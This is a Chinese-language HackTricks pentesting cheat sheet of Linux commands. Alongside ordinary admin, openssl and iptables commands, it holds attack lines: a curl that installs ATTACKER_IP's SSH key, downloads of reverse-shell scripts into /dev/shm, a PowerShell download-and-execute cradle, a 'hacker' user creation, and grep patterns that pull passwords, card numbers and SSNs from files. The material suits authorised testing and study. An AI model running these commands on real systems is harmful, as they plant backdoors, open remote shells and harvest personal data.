# 有用的Linux命令

![](<../../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 常见的Bash命令
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 适用于Windows的Bash
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

### grep

`grep` 是一个强大的命令行工具，用于在文件中搜索指定的模式。它可以根据正则表达式匹配文本，并返回匹配的行。

```bash
grep pattern file
```

- `pattern`：要搜索的模式。
- `file`：要搜索的文件。

### egrep

`egrep` 是 `grep` 的扩展版本，支持更复杂的正则表达式语法。它可以使用元字符、字符类和量词等高级特性。

```bash
egrep pattern file
```

- `pattern`：要搜索的模式。
- `file`：要搜索的文件。

### fgrep

`fgrep` 是 `grep` 的快速版本，也称为固定字符串搜索。它不支持正则表达式，只能搜索固定的字符串。

```bash
fgrep pattern file
```

- `pattern`：要搜索的模式。
- `file`：要搜索的文件。

### zgrep

`zgrep` 是 `grep` 的压缩文件版本，用于搜索压缩文件中的文本。它可以直接搜索 `.gz` 和 `.bz2` 格式的文件。

```bash
zgrep pattern file.gz
```

- `pattern`：要搜索的模式。
- `file.gz`：要搜索的压缩文件。

### zegrep

`zegrep` 是 `egrep` 的压缩文件版本，用于在压缩文件中搜索复杂的正则表达式模式。

```bash
zegrep pattern file.gz
```

- `pattern`：要搜索的模式。
- `file.gz`：要搜索的压缩文件。

### zfgrep

`zfgrep` 是 `fgrep` 的压缩文件版本，用于在压缩文件中搜索固定的字符串。

```bash
zfgrep pattern file.gz
```

- `pattern`：要搜索的模式。
- `file.gz`：要搜索的压缩文件。
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Nmap搜索帮助

Nmap是一款功能强大的网络扫描工具，用于发现和评估网络上的主机和服务。以下是一些常用的Nmap搜索命令和选项的帮助信息：

- `-p <port>`：指定要扫描的端口号。可以使用单个端口、端口范围或逗号分隔的端口列表。
- `-p-`：扫描所有端口。
- `-sS`：使用TCP SYN扫描技术进行扫描。
- `-sU`：使用UDP扫描技术进行扫描。
- `-A`：启用操作系统检测、版本检测、脚本扫描和Traceroute等功能。
- `-O`：进行操作系统检测。
- `-sV`：进行版本检测。
- `-sC`：启用默认的脚本扫描。
- `-T<0-5>`：设置扫描速度。0表示最慢，5表示最快。
- `-oN <file>`：将扫描结果保存到指定的文件中。
- `--script <script>`：指定要运行的Nmap脚本。
- `--script-args <args>`：为Nmap脚本提供参数。

更多详细的Nmap搜索命令和选项，请参考[Nmap官方文档](https://nmap.org/book/man.html)。

使用Nmap时，请确保遵守适用的法律和道德规范，并获得适当的授权。
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash（Bourne Again SHell）是一种常见的Unix shell和命令语言。它是许多Linux发行版的默认shell，并且在macOS上也是默认的shell。

### 基本命令

以下是一些常用的Bash命令：

- `ls`：列出当前目录中的文件和文件夹。
- `cd`：更改当前工作目录。
- `pwd`：显示当前工作目录的路径。
- `mkdir`：创建一个新的目录。
- `rm`：删除文件或目录。
- `cp`：复制文件或目录。
- `mv`：移动文件或目录。
- `cat`：显示文件的内容。
- `grep`：在文件中搜索指定的模式。
- `chmod`：更改文件或目录的权限。
- `chown`：更改文件或目录的所有者。
- `chgrp`：更改文件或目录的组。

### 文件操作

以下是一些常用的文件操作命令：

- `touch`：创建一个新文件或更新现有文件的访问和修改时间。
- `head`：显示文件的前几行。
- `tail`：显示文件的最后几行。
- `less`：以交互方式显示文件的内容。
- `wc`：计算文件中的行数、字数和字节数。
- `sort`：对文件的行进行排序。
- `uniq`：从文件中删除重复的行。
- `diff`：比较两个文件的内容。

### 系统信息

以下是一些获取系统信息的命令：

- `uname`：显示系统的名称和版本。
- `whoami`：显示当前用户的用户名。
- `hostname`：显示计算机的主机名。
- `uptime`：显示系统的运行时间。
- `df`：显示文件系统的磁盘空间使用情况。
- `free`：显示系统的内存使用情况。
- `top`：显示当前运行的进程和系统资源的使用情况。

### 网络操作

以下是一些网络操作命令：

- `ping`：向指定的主机发送网络请求以测试连接。
- `ifconfig`：显示和配置网络接口的信息。
- `netstat`：显示网络连接、路由表和网络接口的信息。
- `ssh`：通过安全的Shell连接到远程主机。
- `scp`：通过安全的文件传输协议在本地主机和远程主机之间复制文件。

### 进程管理

以下是一些进程管理命令：

- `ps`：显示当前运行的进程。
- `kill`：终止指定的进程。
- `top`：显示当前运行的进程和系统资源的使用情况。
- `bg`：将一个进程放到后台运行。
- `fg`：将一个进程放到前台运行。

### 用户和权限

以下是一些用户和权限管理命令：

- `sudo`：以超级用户权限执行命令。
- `su`：切换到其他用户。
- `passwd`：更改用户的密码。
- `useradd`：创建一个新用户。
- `userdel`：删除一个用户。
- `groupadd`：创建一个新组。
- `groupdel`：删除一个组。
- `chmod`：更改文件或目录的权限。
- `chown`：更改文件或目录的所有者。
- `chgrp`：更改文件或目录的组。

### Shell脚本

Bash还可以用于编写和执行Shell脚本。Shell脚本是一系列Bash命令的集合，可以自动化执行任务。

要执行一个Shell脚本，可以使用以下命令：

```bash
bash script.sh
```

其中`script.sh`是要执行的Shell脚本的文件名。

### 总结

这只是Bash的一小部分功能和命令。Bash是一种非常强大和灵活的工具，可以帮助您在Linux系统上进行各种任务和操作。熟练掌握Bash命令和脚本编写将使您的工作更加高效和便捷。
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network traffic by creating rules and chains. Here are some useful commands for working with iptables:

### List all rules

To view all the rules currently set in iptables, use the following command:

```bash
iptables -L
```

### Flush all rules

To remove all the rules from iptables, use the following command:

```bash
iptables -F
```

### Block an IP address

To block a specific IP address from accessing your system, use the following command:

```bash
iptables -A INPUT -s <IP_ADDRESS> -j DROP
```

Replace `<IP_ADDRESS>` with the actual IP address you want to block.

### Allow incoming traffic on a specific port

To allow incoming traffic on a specific port, use the following command:

```bash
iptables -A INPUT -p <PROTOCOL> --dport <PORT_NUMBER> -j ACCEPT
```

Replace `<PROTOCOL>` with the desired protocol (e.g., tcp, udp) and `<PORT_NUMBER>` with the port number you want to allow.

### Save iptables rules

To save the current iptables rules, use the following command:

```bash
iptables-save > /etc/iptables/rules.v4
```

This will save the rules to the specified file (`/etc/iptables/rules.v4` in this example).

### Load iptables rules

To load previously saved iptables rules, use the following command:

```bash
iptables-restore < /etc/iptables/rules.v4
```

This will load the rules from the specified file (`/etc/iptables/rules.v4` in this example).

### Conclusion

Iptables is a versatile tool for managing network traffic on Linux systems. By using these commands, you can effectively configure and control the firewall settings to enhance the security of your system.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
